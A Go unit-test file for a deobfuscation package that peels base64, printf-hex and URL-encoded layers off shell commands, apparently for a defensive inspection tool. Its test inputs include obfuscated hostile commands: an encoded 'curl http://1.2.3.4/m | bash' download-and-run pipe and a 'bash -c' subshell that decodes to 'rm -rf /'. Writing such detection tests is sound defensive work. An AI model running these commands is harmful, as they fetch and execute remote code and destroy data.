package deobf

import (
	"strings"
	"testing"
)

func TestDecodeBareBase64(t *testing.T) {
	// base64("hello world") = "aGVsbG8gd29ybGQ="
	r := Decode("aGVsbG8gd29ybGQ=")
	if len(r.Layers) == 0 {
		t.Fatalf("expected base64 layer, got none")
	}
	if r.Final != "hello world" {
		t.Errorf("Final = %q want 'hello world'", r.Final)
	}
	if r.Layers[0].Kind != "base64" {
		t.Errorf("kind = %q want base64", r.Layers[0].Kind)
	}
}

func TestDecodeEchoPipe(t *testing.T) {
	cmd := `echo "Y3VybCBodHRwOi8vMS4yLjMuNC9tIHwgYmFzaA==" | base64 -d | bash`
	r := Decode(cmd)
	if len(r.Layers) == 0 {
		t.Fatalf("no layers for echo|base64|bash wrapper")
	}
	if !strings.Contains(r.Final, "curl http://1.2.3.4/m") {
		t.Errorf("Final = %q", r.Final)
	}
	if r.Layers[0].Kind != "echo-pipe-base64" {
		t.Errorf("kind = %q", r.Layers[0].Kind)
	}
}

func TestDecodeBashCSubshell(t *testing.T) {
	// base64("rm -rf /") = "cm0gLXJmIC8="
	cmd := `bash -c "$(echo cm0gLXJmIC8= | base64 -d)"`
	r := Decode(cmd)
	if len(r.Layers) == 0 {
		t.Fatalf("no layers")
	}
	if r.Final != "rm -rf /" {
		t.Errorf("Final = %q want 'rm -rf /'", r.Final)
	}
}

func TestDecodePrintfHex(t *testing.T) {
	// printf '\x69\x64' -> "id"
	r := Decode(`printf '\x69\x64' | sh`)
	if len(r.Layers) == 0 {
		t.Fatalf("no layers")
	}
	if r.Layers[0].Kind != "printf-hex" {
		t.Errorf("kind = %q", r.Layers[0].Kind)
	}
	if r.Layers[0].Decoded != "id" {
		t.Errorf("decoded = %q want 'id'", r.Layers[0].Decoded)
	}
}

func TestDecodeURLEncoded(t *testing.T) {
	r := Decode("curl http://x/%72%6F%6F%74%6B%69%74")
	if len(r.Layers) == 0 {
		t.Fatalf("no layers")
	}
	if !strings.Contains(r.Final, "rootkit") {
		t.Errorf("Final = %q", r.Final)
	}
}

func TestDecodeNoMatch(t *testing.T) {
	r := Decode("ls -la /tmp")
	if len(r.Layers) != 0 {
		t.Errorf("expected no layers for plain command, got %+v", r.Layers)
	}
	if r.Final != "ls -la /tmp" {
		t.Errorf("Final = %q want unchanged", r.Final)
	}
}

func TestDecodeBinaryRejected(t *testing.T) {
	// hex of binary blob - should not be surfaced as deobfuscation
	r := Decode("0001020304ff feabcdef0011")
	for _, l := range r.Layers {
		// Any "decoded" layer must look printable
		if !looksPrintable(l.Decoded) {
			t.Errorf("surfaced non-printable decode: %q", l.Decoded)
		}
	}
}

func TestDepthCap(t *testing.T) {
	// nested base64: base64(base64("ok"))
	// base64("ok") = "b2s="
	// base64("b2s=") = "YjJzPQ=="
	r := Decode("YjJzPQ==")
	if len(r.Layers) > MaxDepth {
		t.Errorf("exceeded MaxDepth: %d layers", len(r.Layers))
	}
}
